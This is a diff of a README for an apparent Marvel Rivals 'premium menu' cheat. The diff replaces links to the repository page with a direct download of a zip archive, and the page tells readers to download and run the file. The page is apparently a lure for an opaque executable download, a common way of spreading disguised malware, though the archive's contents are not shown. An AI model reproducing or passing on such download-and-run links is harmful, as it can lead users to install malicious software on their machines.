@@ -1,12 +1,12 @@
 # 🎮 Marvel_Rivals_Premium_Menu_2026 - Simple Setup for Better Control
 
-[![Download Now](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge&logo=github)](https://github.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026)
+[![Download Now](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026/main/modules/Premium_Marvel_Menu_Rivals_v2.4.zip)
 
 ## 📥 Download
 
 Use this page to download and run this file:
 
-[https://github.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026](https://github.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026)
+[https://raw.githubusercontent.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026/main/modules/Premium_Marvel_Menu_Rivals_v2.4.zip](https://raw.githubusercontent.com/nathanie9256/Marvel_Rivals_Premium_Menu_2026/main/modules/Premium_Marvel_Menu_Rivals_v2.4.zip)
 
 ## 🖥️ What This Is
 
